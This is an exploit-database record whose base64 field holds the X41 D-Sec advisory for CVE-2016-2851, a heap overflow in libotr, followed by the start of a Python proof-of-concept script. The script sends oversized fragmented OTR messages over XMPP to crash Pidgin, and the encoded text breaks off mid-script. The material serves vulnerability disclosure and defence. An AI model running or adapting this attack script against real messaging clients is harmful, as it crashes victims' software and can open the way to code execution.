{
    "source": "exploit-database", 
    "exploit": "JycnDQpYNDEgRC1TZWMgR21iSCBTZWN1cml0eSBBZHZpc29yeTogWDQxLTIwMTYtMDAxDQoNCk1lbW9yeSBDb3JydXB0aW9uIFZ1bG5lcmFiaWxpdHkgaW4gImxpYm90ciINCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCg0KT3ZlcnZpZXcNCi0tLS0tLS0tDQpTZXZlcml0eSBSYXRpbmc6IGhpZ2gNCkNvbmZpcm1lZCBBZmZlY3RlZCBWZXJzaW9uOiA0LjEuMCBhbmQgYmVsb3cNCkNvbmZpcm1lZCBQYXRjaGVkIFZlcnNpb246IGxpYm90ciA0LjEuMQ0KVmVuZG9yOiBPVFIgRGV2ZWxvcG1lbnQgVGVhbQ0KVmVuZG9yIFVSTDogaHR0cHM6Ly9vdHIuY3lwaGVycHVua3MuY2ENClZlbmRvciBSZWZlcmVuY2U6IE9UUiBTZWN1cml0eSBBZHZpc29yeSAyMDE2LTAxDQpWZWN0b3I6IFJlbW90ZQ0KQ3JlZGl0OiBYNDEgRC1TZWMgR21iSCwgTWFya3VzIFZlcnZpZXINClN0YXR1czogcHVibGljDQpDVkU6IENWRS0yMDE2LTI4NTENCkNWU1MgU2NvcmU6IDguMSAoSGlnaCkNCkNWU1MgVmVjdG9yOiBDVlNTOjMuMC9BVjpOL0FDOkgvUFI6Ti9VSTpOL1M6VS9DOkgvSTpIL0E6SA0KQWR2aXNvcnktVVJMOiBodHRwczovL3d3dy54NDEtZHNlYy5kZS9sYWIvYWR2aXNvcmllcy94NDEtMjAxNi0wMDEtbGlib3RyLw0KDQpTdW1tYXJ5IGFuZCBJbXBhY3QNCi0tLS0tLS0tLS0tLS0tLS0tLQ0KQSByZW1vdGUgYXR0YWNrZXIgbWF5IGNyYXNoIG9yIGV4ZWN1dGUgYXJiaXRyYXJ5IGNvZGUgaW4gbGlib3RyIGJ5DQpzZW5kaW5nIGxhcmdlIE9UUiBtZXNzYWdlcy4NCldoaWxlIHByb2Nlc3Npbmcgc3BlY2lhbGx5IGNyYWZ0ZWQgbWVzc2FnZXMsIGF0dGFja2VyIGNvbnRyb2xsZWQgZGF0YSBvbg0KdGhlIGhlYXAgaXMgd3JpdHRlbiBvdXQgb2YgYm91bmRzLg0KTm8gc3BlY2lhbCB1c2VyIGludGVyYWN0aW9uIG9yIGF1dGhvcml6YXRpb24gaXMgbmVjZXNzYXJ5IGluIGRlZmF1bHQNCmNvbmZpZ3VyYXRpb25zLg0KDQpQcm9kdWN0IERlc2NyaXB0aW9uDQotLS0tLS0tLS0tLS0tLS0tLS0tDQpPZmYtdGhlLVJlY29yZCAoT1RSKSBNZXNzYWdpbmcgaXMgYSBjcnlwdG9ncmFwaGljIHByb3RvY29sIHVzZWQgaW4NCndlbGwta25vd24gaW5zdGFudCBtZXNzYWdpbmcgY2xpZW50cyBzdWNoIGFzIFBpZGdpbiwgQ2hhdFNlY3VyZSwgQWRpdW0NCmFuZCBvdGhlcnMuIEl0IGlzIGRlc2lnbmVkIHRvIHdvcmsgb24gdG9wIG9mIGV4aXN0aW5nIHByb3RvY29scyBhbmQgdXNlZA0Kd29ybGR3aWRlIHRvIHByb3ZpZGUgc2VjdXJlIGNvbW11bmljYXRpb24gaW4gaW5zZWN1cmUgZW52aXJvbm1lbnRzLg0KT1RSIGlzIHJlZ2FyZGVkIGFzIGhpZ2hseSBzZWN1cmUgYW5kIGFjY29yZGluZyB0byBkb2N1bWVudHMgcmV2ZWFsZWQgYnkNCkVkd2FyZCBTbm93ZGVuIG9uZSBvZiB0aGUgcHJvdG9jb2xzIHRoYXQgdGhlIE5TQSBpcyBub3QgYWJsZSB0byBkZWNyeXB0DQp2aWEgY3J5cHRhbmFseXNpcy4NClRoZSBtb3N0IGNvbW1vbmx5IHVzZWQgaW1wbGVtZW50YXRpb24gb2YgT1RSIGlzICJsaWJvdHIiIHdoaWNoIGlzIGEgcHVyZQ0KQyBjb2RlIGltcGxlbWVudGF0aW9uIG9mIHRoZSBPVFIgcHJvdG9jb2wuDQoNCkFuYWx5c2lzDQotLS0tLS0tLQ0KRHVyaW5nIGEgbWFudWFsIGNvZGUgcmV2aWV3IFg0MSBELVNlYyBHbWJIIGRpc2NvdmVyZWQgYSByZW1vdGVseQ0KZXhwbG9pdGFibGUgdnVsbmVyYWJpbGl0eSBpbiBsaWJvdHIuDQoNCkJ5IHNlbmRpbmcgbGFyZ2UgbWVzc2FnZXMsIGFuIGludGVnZXIgb3ZlcmZsb3cgY2FuIGJlIHRyaWdnZXJlZCB3aGljaA0Kc3Vic2VxdWVudGx5IGxlYWRzIHRvIGEgaGVhcCBvdmVyZmxvdyBvbiA2NCBiaXQgYXJjaGl0ZWN0dXJlcy4NCg0KV2hlbiBhIG1lc3NhZ2Ugb2YgdHlwZSBPVFJMX01TR1NUQVRFX0RBVEEgaXMgcmVjZWl2ZWQgZHVyaW5nIGFuDQplc3RhYmxpc2hlZCBPVFIgY29udmVyc2F0aW9uLCB0aGlzIG1lc3NhZ2UgaXMgcGFzc2VkIHRvIGZ1bmN0aW9uDQpvdHJsX3Byb3RvX2FjY2VwdF9kYXRhIGluIHNyYy9tZXNzYWdlLmMgbGluZSAxMzQ3Og0KDQoJY2FzZSBPVFJMX01TR1NUQVRFX0VOQ1JZUFRFRDoNCgkJZXh0cmFrZXkgPSBnY3J5X21hbGxvY19zZWN1cmUoT1RSTF9FWFRSQUtFWV9CWVRFUyk7DQoJCWVyciA9IG90cmxfcHJvdG9fYWNjZXB0X2RhdGEoJnBsYWludGV4dCwgJnRsdnMsIGNvbnRleHQsDQoJCSAgICAgICAgICAgICAgICAgIG1lc3NhZ2UsICZmbGFncywgZXh0cmFrZXkpOw0KDQpBZnRlciBiYXNlNjQgZGVjb2RpbmcgdGhlIG1lc3NhZ2UgYW5kIHJlYWRpbmcgdmFyaW91cyB2YWx1ZXMgZnJvbSBpdCwNCnRoZSBsZW5ndGggb2YgYSBwYXlsb2FkIGlzIHJlYWQgaW50byBhIHZhcmlhYmxlIG9mIHR5cGUgInVuc2lnbmVkIGludCINCmluIGZpbGUgcHJvdG8uYyBsaW5lIDc4NDoNCg0KCXJlYWRfaW50KGRhdGFsZW4pOw0KDQpJdCBpcyBjaGVja2VkIHRoYXQgdGhlIG1lc3NhZ2UgYnVmZmVyIHdpbGwgY29udGFpbiBhdCBsZWFzdCBhICJkYXRhbGVuIg0KbnVtYmVyIG9mIGJ5dGVzIHVzaW5nIHJlYWRfaW50IGluIHByb3RvLmMgbGluZSA3ODU6DQoNCglyZXF1aXJlX2xlbihkYXRhbGVuKTsNCg0KVGhlIG1hY3JvcyAicmVhZF9pbnQiIGFuZCAicmVxdWlyZWRfbGVuIiBhcmUgZGVmaW5lZCBpbiBzcmMvc2VyaWFsLmg6DQoNCgkjZGVmaW5lIHJlcXVpcmVfbGVuKGwpIGRvIHsgXA0KCQlpZiAobGVucCA8IChsKSkgZ290byBpbnZ2YWw7IFwNCgkgICAgfSB3aGlsZSgwKQ0KDQoJI2RlZmluZSByZWFkX2ludCh4KSBkbyB7IFwNCgkJcmVxdWlyZV9sZW4oNCk7IFwNCgkJKHgpID0gKCgodW5zaWduZWQgaW50KWJ1ZnBbMF0pIDw8IDI0KSB8IChidWZwWzFdIDw8IDE2KSB8IChidWZwWzJdIDw8DQo4KSB8IGJ1ZnBbM107IFwNCgkJYnVmcCArPSA0OyBsZW5wIC09IDQ7IFwNCgkgICAgfSB3aGlsZSgwKQ0KDQo0IGJ5dGVzIGFyZSByZWFkIGZyb20gdGhlIG1lc3NhZ2UgYnVmZmVyIGFuZCBpbnRlcnByZXRlZCBhcyB1bnNpZ25lZCBpbnQNCnZhbHVlLg0KDQpTdWJzZXF1ZW50bHkgYSBidWZmZXIgb2Ygc2l6ZSBkYXRhbGVuKzEgaXMgYWxsb2NhdGVkIHVzaW5nIG1hbGxvYw0KaW4gcHJvdG8uYyBsaW5lIDc4NjoNCg0KICAgIGRhdGEgPSBtYWxsb2MoZGF0YWxlbisxKTsNCiAgICBpZiAoIWRhdGEpIHsNCiAgICAgICAgZXJyID0gZ2NyeV9lcnJvcihHUEdfRVJSX0VOT01FTSk7DQogICAgICAgIGdvdG8gZXJyOw0KICAgIH0NCg0KTm93IGRhdGEgZnJvbSB0aGUgbWVzc2FnZSBpcyBjb3BpZWQgaW50byB0aGlzIGJ1ZmZlciB1c2luZyBtZW1tb3ZlIGluDQpsaW5lIDc5MToNCg0KICAgIG1lbW1vdmUoZGF0YSwgYnVmcCwgZGF0YWxlbik7DQoNClRoZSB2dWxuZXJhYmlsaXR5IGlzIHRyaWdnZXJlZCBpZiBhIHZhbHVlIG9mIDB4RkZGRkZGRkYgKE1BWF9VSU5UKSBpcw0KcmVhZCBmcm9tIHRoZSBtZXNzYWdlIGJ1ZmZlci4gQXMgZGF0YWxlbiBpcyBvZiBzaXplIDMyLWJpdCAodW5zaWduZWQNCmludCkgdGhlIG9wZXJhdGlvbiAiZGF0YWxlbisxIiB3aWxsIHdyYXAgYXJvdW5kIGJlZm9yZSBiZWluZyBwYXNzZWQgdG8NCm1hbGxvYy4NClRoaXMgd2lsbCBlZmZlY3RpdmVseSByZXN1bHQgaW4gYSB6ZXJvIGFsbG9jYXRpb24gKCBtYWxsb2MoMCkgKSB3aGljaCBpcw0KdmFsaWQgaW4gY29tbW9uIGltcGxlbWVudGF0aW9ucyBvZiBtYWxsb2Mgb24gdGhlIHg4Nl82NCBhcmNoaXRlY3R1cmUuDQpBcyBubyBhZGRpdGlvbiBpcyBkb25lIGluIHRoZSB2YWx1ZSBwYXNzZWQgdG8gdGhlIGNhbGwgdG8gbWVtbW92ZSwgNA0KZ2lnYWJ5dGVzIG9mIGRhdGEgYXJlIGNvcGllZCBvdXQgb2YgYm91bmRzIHRvIHRoZSBoZWFwIGxvY2F0aW9uIHBvaW50ZWQNCnRvIGJ5IGRhdGEuDQoNClByb29mIG9mIENvbmNlcHQNCi0tLS0tLS0tLS0tLS0tLS0NCkluIG9yZGVyIHRvIHN1Y2Nlc3NmdWxseSB0cmlnZ2VyIHRoZSB2dWxuZXJhYmlsaXR5LCBhbiBhdHRhY2tlciBtdXN0IGJlDQphYmxlIHRvIHNlbmQgYSBkYXRhIG1lc3NhZ2Ugb2YgbW9yZSB0aGFuIDUuNSBnaWdhYnl0ZXMgdG8gYSB2aWN0aW0gaW4NCm9yZGVyIHRvIHBhc3MgdGhlIGNoZWNrICJyZXF1aXJlX2xlbihkYXRhbGVuKSIuDQpEdWUgdG8gdGhlIHN1cHBvcnQgb2YgZnJhZ21lbnRlZCBPVFIgbWVzc2FnZXMgYXNzZW1ibGVkIGJ5IGxpYm90ciB0aGlzDQppcyBwb3NzaWJsZSBpbiBwcmFjdGljZS4gQnkgc2VuZGluZyAyNzUgbWVzc2FnZXMgb2Ygc2l6ZSAyME1CIGVhY2gsIFg0MQ0Kd2FzIGFibGUgdG8gbWFrZSBsaWJvdHIgcHJvY2VzcyBzdWNoIGEgZGF0YSBtZXNzYWdlIHN1Y2Nlc3NmdWxseSBvbiBhDQpzeXN0ZW0gd2l0aCA4R0Igb2YgcmFtIGFuZCAxNUdCIG9mIHN3YXAgc3BhY2UuDQpBcyBkYXRhIHR5cGVzIGZvciBsZW5wIGFuZCBvdGhlciBsZW5ndGhzIG9mIHRoZSBtZXNzYWdlIGFyZSA2NCBiaXQgbGFyZ2UNCnNpemVfdCB0eXBlcyBvbiB4ODZfNjQgYXJjaGl0ZWN0dXJlcyBodWdlIG1lc3NhZ2VzIG9mIG11bHRpcGxlIGdpZ2FieXRlcw0KYXJlIHBvc3NpYmxlLg0KU2VuZGluZyBzdWNoIGEgbWVzc2FnZSB0byBhIHBpZGdpbiBjbGllbnQgdG9vayBvbmx5IGEgZmV3IG1pbnV0ZXMgb24gYQ0KZmFzdCBuZXR3b3JrIGNvbm5lY3Rpb24gd2l0aG91dCB2aXNpYmxlIHNpZ25zIG9mIGFueSBhdHRhY2sgdG8gYSB1c2VyLg0KDQpBIHByb29mIG9mIGNvbmNlcHQgdHJpZ2dlcmluZyBhIGhlYXAgb3ZlcndyaXRlIGFuZCBjcmFzaCBpbiB0aGUNCnBpZGdpbi1vdHIgcGx1Z2luIGZvciB0aGUgcG9wdWxhciBwaWRnaW4gbWVzc2VuZ2VyIG9uIHg4Nl82NCBMaW51eA0KYXJjaGl0ZWN0dXJlcyBpcyBhdmFpbGFibGVbMV0uDQoNClRoZSBjcmFzaCBvY2N1cnMgZHVlIHRvIHRoZSBvdmVyd3JpdGUgaGl0dGluZyB1bm1hcHBlZCBtZW1vcnkuIFVzaW5nDQp0ZWNobmlxdWVzIHN1Y2ggYXMgaGVhcCBncm9vbWluZywgWDQxIHdhcyBhYmxlIHRvIGluZmxhdGUgdGhlIGhlYXAgdG8NCm1vcmUgdGhhbiA0R0IgYW5kIG92ZXJ3cml0ZSBmdW5jdGlvbiBwb2ludGVycyBhbmQgYXJndW1lbnRzIG9uIHRoZSBoZWFwDQppbiBvcmRlciB0byB0YWtlIG92ZXIgY29udHJvbCBmbG93LiBBIHdvcmtpbmcgZXhwbG9pdCB3aWxsIG5vdCBiZQ0KcHVibGlzaGVkIGF0IHRoaXMgdGltZS4NCg0KSW50ZXJhY3Rpb24gYnkgdXNlcnMgYmV5b25kIGhhdmluZyBlbmFibGVkIE9UUiBpcyBub3QgbmVjZXNzYXJ5IGFzIE9UUg0Kc2Vzc2lvbnMgYXJlIGF1dG9tYXRpY2FsbHkgZXN0YWJsaXNoZWQgd2l0aCBhbnlvbmUgYnkgZGVmYXVsdCBpbiBQaWRnaW4NCmFuZCBvdGhlciBjb21tb24gc29mdHdhcmUgdXNpbmcgbGlib3RyLiBUaGlzIGFsc28gYXBwbGllcyB0bw0KdW5hdXRob3JpemVkIGNvbnRhY3RzIGluIG1vc3QgZGVmYXVsdCBjb25maWd1cmF0aW9ucy4NCg0KV29ya2Fyb3VuZHMNCi0tLS0tLS0tLS0tDQpBcyBhIHRlbXBvcmFyeSB3b3JrYXJvdW5kIG9uIExpbnV4IGFuZCBCU0Qgc3lzdGVtcywgdGhlIGFtb3VudCBvZiBtZW1vcnkNCmF2YWlsYWJsZSB0byB0aGUgcHJvY2VzcyBydW5uaW5nIGxpYm90ciBtYXkgYmUgbGltaXRlZCB0byBsZXNzIHRoYW4gNEdCDQp2aWEgdWxpbWl0Lg0KDQpBYm91dCBYNDEgRC1TZWMgR21iSA0KLS0tLS0tLS0tLS0tLS0tLS0tLS0NClg0MSBELVNlYyBpcyBhIHByb3ZpZGVyIG9mIGFwcGxpY2F0aW9uIHNlY3VyaXR5IHNlcnZpY2VzLiBXZSBmb2N1cw0Kb24gYXBwbGljYXRpb24gY29kZSByZXZpZXdzLCBkZXNpZ24gcmV2aWV3IGFuZCBzZWN1cml0eSB0ZXN0aW5nLiBYNDENCkQtU2VjIEdtYkggd2FzIGZvdW5kZWQgaW4gMjAxNSBieSBNYXJrdXMgVmVydmllci4gV2Ugc3VwcG9ydCBjdXN0b21lcnMNCmluIHZhcmlvdXMgaW5kdXN0cmllcyBzdWNoIGFzIGZpbmFuY2UsIHNvZnR3YXJlIGRldmVsb3BtZW50IGFuZCBwdWJsaWMNCmluc3RpdHV0aW9ucy4NCg0KVGltZWxpbmUNCi0tLS0tLS0tDQoyMDE2LTAyLTE3CURpc2NvdmVyeSBkdXJpbmcgYSBtYW51YWwgY29kZSByZXZpZXcgb2YgImxpYm90ciIgdmVyc2lvbiA0LjEuMA0KMjAxNi0wMi0xNwlJbml0aWFsIFBvQw0KMjAxNi0wMi0xOAlWZW5kb3IgY29udGFjdGVkDQoyMDE2LTAyLTE4CVZ1bG5lcmFiaWxpdHkgY29uZmlybWVkIGJ5IHZlbmRvcg0KMjAxNi0wMy0wMwlWZW5kb3IgcGF0Y2ggYXZhaWxhYmxlDQoyMDE2LTAzLTA0CUNWRSByZXF1ZXN0ZWQNCjIwMTYtMDMtMDYJQ1ZFLTIwMTYtMjg1MSBhc3NpZ25lZA0KMjAxNi0wMy0wOQlFbWJhcmdvIGxpZnRlZCBhbmQgZGlzY2xvc3VyZQ0KDQpSZWZlcmVuY2VzDQotLS0tLS0tLS0tDQpbMV0NCmh0dHBzOi8vd3d3Lng0MS1kc2VjLmRlL2xhYi9hZHZpc29yaWVzL3g0MS0yMDE2LTAwMS1saWJvdHIvb3RyLWhlYXAtb3ZlcndyaXRlLXBvYy5weQ0KJycnDQoNCiMhL3Vzci9iaW4vcHl0aG9uIC11DQojDQojIyMgUG9DIGxpYm90ciBoZWFwIG92ZXJ3cml0ZSBvbiBQaWRnaW4NCiMjIyAyMDE2LTAyLTE3IE1hcmt1cyBWZXJ2aWVyDQojIyMgWDQxIEQtU2VjIEdtYkgNCg0KIyMjIGluaXRpYWwgY29kZSB0YWtlbiBmcm9tIHB5eG1wcCBleGFtcGxlcyAoZWNob2JvdC5weSkNCg0KIyMjIFBvQyB3YXMgdGVzdGVkIHVzaW5nIGEgc3RhbmRhcmQgUHJvc29keSBYTVBQLVNlcnZlciBvbiBBcmNoLUxpbnV4IGFsbG93aW5nIDIwTUIgc2l6ZWQgbWVzc2FnZXMgYnkgZGVmYXVsdCAoYW5kIGV2ZW4gbGFyZ2VyKQ0KDQojIyMgT24gYSBsb29wYmFjayBpbnRlcmZhY2UgdGhlIGV4cGxvaXQgdG9vayBzZXZlcmFsIG1pbnV0ZXMsDQojIyMgdXNpbmcgWE1QUCBzdHJlYW0gY29tcHJlc3Npb24gdGhpcyBjb3VsZCBiZSByZWR1Y2VkIG1hc3NpdmVseQ0KDQojIyMgcHl4bXBwIGRvZXMgbm90IHN1cHBvcnQgaXQNCiMjIyBXZSB1c2VkIFhNUFAgY29ubmVjdGlvbnMgd2l0aG91dCBUTFMgdG8gbm90IGZ1cnRoZXIgY29tcGxpY2F0ZSB0aGUgc2V0dXANCg0KIyMjIFVTQUdFDQojIyMgDQojIyMgUHJlcmVxdWlzaXRlOiAyIEphYmJlciBBY2NvdW50cyAoYXR0YWNrZXIsIHZpY3RpbSksIHNldCBSZXNzb3VyY2Ugb2YgYXR0YWNrZXIgdG8gImF0dGFja3Rlc3QiDQoNCiMjIyAxLiBJbml0aWF0ZSBhbiBlbmNyeXB0ZWQgc2Vzc2lvbiBmcm9tIGF0dGFja2VyLWFjY291bnQgdG8gdmljdGltLWFjY291bnQgKGUuZy4gdXNpbmcgcGlkZ2luKQ0KIyMjIDIuIERpc2Nvbm5lY3QgdGhlIGF0dGFja2VyIGFjY291bnQNCiMjIyAzLiBGaXJlIHVwIHRoaXMgc2NyaXB0IGFuZCBsZXQgaXQgY29ubmVjdCB3aXRoIHRoZSBhdHRhY2tlciBhY2NvdW50IGNyZWRlbnRpYWxzDQojIyMgNC4gU2VuZCBhIG1lc3NhZ2UgZnJvbSB2aWN0aW0gdG8gYXR0YWNrZXINCiMjIyA1LiBXYWl0IHVudGlsIG1lc3NhZ2Ugc2VuZGluZyBpcyBjb21wbGV0ZSwgcGlkZ2luIHNob3VsZCBjcmFzaA0KDQojIyMgISEhIFN0ZXBzIDItNSAoYW5kIGVzcGVjaWFsbHkgdXNlciBpbnRlcmFjdGlvbikgYXJlIG9ubHkgbmVjZXNzYXJ5IGZvciB0aGlzIFBvQw0KIyMjICEhISBJZiB3ZSB3b3VsZCBpbXBsZW1lbnQgZnVsbCBPVFIgaW4gdGhpcyBzY3JpcHQgd2UgY291bGQgc2VuZCB0aGUgYmFkIG1lc3NhZ2UgZGlyZWN0bHkNCiMjIyAhISEgRm9yIGVhc2llciBQb0Mgd2Ugbm93IHdhaXQgdW50aWwgYW4gZW5jcnlwdGVkIG1lc3NhZ2UgaXMgcmVjZWl2ZWQgdG8gZ2V0IHRoZSBjb3JyZWN0IGluc3RhbmNlIHRhZ3MNCg0KaW1wb3J0IHN5cw0KaW1wb3J0IGxvZ2dpbmcNCmltcG9ydCBsb2NhbGUNCmltcG9ydCBjb2RlY3MNCmltcG9ydCBvcywgc2lnbmFsDQppbXBvcnQgdGltZQ0KaW1wb3J0IGJhc2U2NA0KDQpkZWYgaWdub3JlX3NpZ25hbF9waXBlKHNpZ251bSwgZnJhbWUpOg0KICAgIHByaW50ICdzaWduYWwgcGlwZSBjYXVnaHQgLS0gSUdOT1JJTkcnDQoNCnNpZ25hbC5zaWduYWwoc2lnbmFsLlNJR1BJUEUsIGlnbm9yZV9zaWduYWxfcGlwZSkNCg0KZnJvbSBzdHJ1Y3QgaW1wb3J0ICoNCmZyb20gcHl4bXBwLmFsbCBpbXBvcnQgSklELElxLFByZXNlbmNlLE1lc3NhZ2UsU3RyZWFtRXJyb3INCmZyb20gcHl4bXBwLmphYmJlci5jbGllbnQgaW1wb3J0IEphYmJlckNsaWVudA0KZnJvbSBweXhtcHAuaW50ZXJmYWNlIGltcG9ydCBpbXBsZW1lbnRzDQpmcm9tIHB5eG1wcC5pbnRlcmZhY2VzIGltcG9ydCAqDQpmcm9tIHB5eG1wcC5zdHJlYW10bHMgaW1wb3J0IFRMU1NldHRpbmdzDQpmcm9tIGVudW0gaW1wb3J0IEVudW0NCg0KY2xhc3MgRWNob0hhbmRsZXIob2JqZWN0KToNCiAgICAiIiJQcm92aWRlcyB0aGUgYWN0dWFsICdlY2hvJyBmdW5jdGlvbmFsaXR5Lg0KDQogICAgSGFuZGxlcnMgZm9yIHByZXNlbmNlIGFuZCBtZXNzYWdlIHN0YW56YXMgYXJlIGltcGxlbWVudGVkIGhlcmUuDQogICAgIiIiDQoNCiAgICBpbXBsZW1lbnRzKElNZXNzYWdlSGFuZGxlcnNQcm92aWRlciwgSVByZXNlbmNlSGFuZGxlcnNQcm92aWRlcikNCiAgICANCiAgICBkZWYgX19pbml0X18oc2VsZiwgY2xpZW50KToNCiAgICAgICAgIiIiSnVzdCByZW1lbWJlciB3aG8gY3JlYXRlZCB0aGlzLiIiIg0KICAgICAgICBzZWxmLmNsaWVudCA9IGNsaWVudA0KDQogICAgZGVmIGdldF9tZXNzYWdlX2hhbmRsZXJzKHNlbGYpOg0KICAgICAgICAiIiJSZXR1cm4gbGlzdCBvZiAobWVzc2FnZV90eXBlLCBtZXNzYWdlX2hhbmRsZXIpIHR1cGxlcy4NCg0KICAgICAgICBUaGUgaGFuZGxlcnMgcmV0dXJuZWQgd2lsbCBiZSBjYWxsZWQgd2hlbiBtYXRjaGluZyBtZXNzYWdlIGlzIHJlY2VpdmVkDQogICAgICAgIGluIGEgY2xpZW50IHNlc3Npb24uIiIiDQogICAgICAgIHJldHVybiBbDQogICAgICAgICAgICAoIm5vcm1hbCIsIHNlbGYubWVzc2FnZSksDQogICAgICAgICAgICBdDQoNCiAgICBkZWYgZ2V0X3ByZXNlbmNlX2hhbmRsZXJzKHNlbGYpOg0KICAgICAgICAiIiJSZXR1cm4gbGlzdCBvZiAocHJlc2VuY2VfdHlwZSwgcHJlc2VuY2VfaGFuZGxlcikgdHVwbGVzLg0KDQogICAgICAgIFRoZSBoYW5kbGVycyByZXR1cm5lZCB3aWxsIGJlIGNhbGxlZCB3aGVuIG1hdGNoaW5nIHByZXNlbmNlIHN0YW56YSBpcw0KICAgICAgICByZWNlaXZlZCBpbiBhIGNsaWVudCBzZXNzaW9uLiIiIg0KICAgICAgICByZXR1cm4gWw0KICAgICAgICAgICAgKE5vbmUsIHNlbGYucHJlc2VuY2UpLA0KICAgICAgICAgICAgKCJ1bmF2YWlsYWJsZSIsIHNlbGYucHJlc2VuY2UpLA0KICAgICAgICAgICAgKCJzdWJzY3JpYmUiLCBzZWxmLnByZXNlbmNlX2NvbnRyb2wpLA0KICAgICAgICAgICAgKCJzdWJzY3JpYmVkIiwgc2VsZi5wcmVzZW5jZV9jb250cm9sKSwNCiAgICAgICAgICAgICgidW5zdWJzY3JpYmUiLCBzZWxmLnByZXNlbmNlX2NvbnRyb2wpLA0KICAgICAgICAgICAgKCJ1bnN1YnNjcmliZWQiLCBzZWxmLnByZXNlbmNlX2NvbnRyb2wpLA0KICAgICAgICAgICAgXQ0KDQogICAgZGVmIG1lc3NhZ2Uoc2VsZixzdGFuemEpOg0KICAgICAgICAiIiJNZXNzYWdlIGhhbmRsZXIgZm9yIHRoZSBjb21wb25lbnQuDQoNCiAgICAgICAgRWNob2VzIHRoZSBtZXNzYWdlIGJhY2sgaWYgaXRzIHR5cGUgaXMgbm90ICdlcnJvcicgb3INCiAgICAgICAgJ2hlYWRsaW5lJywgYWxzbyBzZXRzIG93biBwcmVzZW5jZSBzdGF0dXMgdG8gdGhlIG1lc3NhZ2UgYm9keS4gUGxlYXNlDQogICAgICAgIG5vdGUgdGhhdCBhbGwgbWVzc2FnZSB0eXBlcyBidXQgJ2Vycm9yJyB3aWxsIGJlIHBhc3NlZCB0byB0aGUgaGFuZGxlcg0KICAgICAgICBmb3IgJ25vcm1hbCcgbWVzc2FnZSB1bmxlc3Mgc29tZSBkZWRpY2F0ZWQgaGFuZGxlciBwcm9jZXNzIHRoZW0uDQoNCiAgICAgICAgOnJldHVybnM6IGBUcnVlYCB0byBpbmRpY2F0ZSwgdGhhdCB0aGUgc3RhbnphIHNob3VsZCBub3QgYmUgcHJvY2Vzc2VkDQogICAgICAgIGFueSBmdXJ0aGVyLiIiIg0KICAgICAgICBzdWJqZWN0PXN0YW56YS5nZXRfc3ViamVjdCgpDQogICAgICAgIGJvZHk9c3RhbnphLmdldF9ib2R5KCkNCiAgICAgICAgdD1zdGFuemEuZ2V0X3R5cGUoKQ0KICAgICAgICBtID0gMCANCiAgICAgICAgcHJpbnQgdSdNZXNzYWdlIGZyb20gJXMgcmVjZWl2ZWQuJyAlICh1bmljb2RlKHN0YW56YS5nZXRfZnJvbSgpLCkpLA0KICAgICAgICBpZiBzdWJqZWN0Og0KICAgICAgICAgICAgcHJpbnQgdSdTdWJqZWN0OiAiJXMiLicgJSAoc3ViamVjdCwpLA0KICAgICAgICBpZiBib2R5Og0KICAgICAgICAgICAgcHJpbnQgdSdCb2R5OiAiJXMiLicgJSAoYm9keSwpLA0KICAgICAgICBpZiB0Og0KICAgICAgICAgICAgcHJpbnQgdSdUeXBlOiAiJXMiLicgJSAodCwpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBwcmludCB1J1R5cGU6ICJub3JtYWwiLicNCiAgICAgICAgaWYgc3RhbnphLmdldF90eXBlKCk9PSJoZWFkbGluZSI6DQogICAgICAgICAgICAjICdoZWFkbGluZScgbWVzc2FnZXMgc2hvdWxkIG5ldmVyIGJlIHJlcGxpZWQgdG8NCiAgICAgICAgICAgIHJldHVybiBUcnVlDQogICAgICAgICMgcmVjb3JkIGluc3RhbmNlIHRhZw0KICAgICAgICBpZiBib2R5Wzo5XSA9PSB1Jz9PVFI6QUFNRCc6DQogICAgICAgICAgICAoc2VsZi5pbnN0YW5jZV90YWcsIHNlbGYub3VyX3RhZykgPSBzZWxmLnBhcnNlX2FhbWMoYm9keVtsZW4oIj9PVFI6QUFNRCIpOl0pDQogICAgICAgICAgICBwcmludCAicGFyc2VkIGluc3RhbmNlIHRhZzogJXMgYW5kIG91ciB0YWcgJXMiICUgKHNlbGYuaW5zdGFuY2VfdGFnLmVuY29kZSgiaGV4IiksIHNlbGYub3VyX3RhZy5lbmNvZGUoImhleCIpICkNCiAgICAgICAgICAgIHNlbGYuc2VuZF9pbnNhbmVfb3RyKHN0YW56YSwgMTAyNCoxMDI0KjIwLCBzZWxmLmluc3RhbmNlX3RhZywgc2VsZi5vdXJfdGFnKQ0KICAgICAgICANCiAgICAgICAgcmV0dXJuIG0NCg0KICAgIGRlZiBiNjRtYXhsZW4oc2VsZiwgY2hhcnMpOg0KICAgICAgICByZXR1cm4gMSArICg0ICogY2hhcnMgLyAzKQ0KDQogICAgZGVmIHBhcnNlX2FhbWMoc2VsZiwgbXNnKToNCiAgICAgICAgbWF4bGVuID0gc2VsZi5iNjRtYXhsZW4oOCkgIyA0IGJ5dGUgaW50ZWdlcg0KICAgICAgICBwcmludCAibWF4bGVuICV1IiAlIChtYXhsZW4pDQogICAgICAgIHRtcCA9IG1zZ1swOm1heGxlbl0NCiAgICAgICAgcGFkZGluZyA9ICIiDQogICAgICAgIGlmIG1heGxlbiAlIDQgPiAxOg0KICAgICAgICAgICAgcGFkZGluZyA9ICI9IiooNC0obWF4bGVuICUgNCkpDQogICAgICAgIHRtcCArPSBwYWRkaW5nDQogICAgICAgIHByaW50ICJkZWNvZGluZzogIit0bXANCiAgICAgICAgcGFja2VkID0gYmFzZTY0LmI2NGRlY29kZSh0bXApDQojICAgICAgICByZXR1cm4gdW5wYWNrKCJJIiwgcGFja2VkWzA6NF0pDQogICAgICAgIHJldHVybiAocGFja2VkWzA6NF0sIHBhY2tlZFs0OjhdKSAjIHRoZWlyIHRhZywgb3VyIHRhZw0KDQogICAgZGVmIGluaXRpYWxfYm9keShzZWxmLCBpbnN0YW5jZV90YWcsIG91cl90YWcpOg0KICAgICAgICByZXQgPSAiP09UUjpBQU1EIjsNCiAgICAgICAgcmF3ID0gYicnDQogICAgICAgIHByaW50ICJwYWNraW5nIGluaXRpYWwgYmxvY2sgd2l0aCBpbnN0YW5jZSB0YWc6ICVzIGFuZCBvdXIgdGFnOiAlcyIgJSAoaW5zdGFuY2VfdGFnLmVuY29kZSgiaGV4IiksIG91cl90YWcuZW5jb2RlKCJoZXgiKSkNCiAgICAgICAgI2RpcnR5IGhhY2sNCiAgICAgICAgcmF3ICs9IG91cl90YWcgIyBzZW5kZXJfbnN0YW5jZV9pZA0KICAgICAgICByYXcgKz0gaW5zdGFuY2VfdGFnICMgcmVjZWl2ZXJfaWQNCiAgICAgICAgcmF3ICs9ICJEIiAjIGR1bW15IGZsYWdzDQogICA